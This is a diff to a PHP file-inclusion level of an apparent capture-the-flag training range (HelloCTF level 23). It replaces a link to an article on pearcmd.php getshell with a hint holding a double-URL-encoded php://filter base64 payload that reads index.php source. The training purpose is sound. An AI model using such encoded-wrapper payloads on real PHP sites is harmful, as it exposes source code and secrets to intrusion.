@@ -10,7 +10,9 @@ include("get_flag.php");
 
 --- HelloCTF - 文件包含基础靶场 关卡 23 : 伪协议读文件二次URL编码 --- 
 
-P牛2021年的文章中 0x06 pearcmd.php的巧妙利用 ：https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html
+try：
+php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=index.php
+
  
 该关卡配置:
 allow_url_fopen=Off
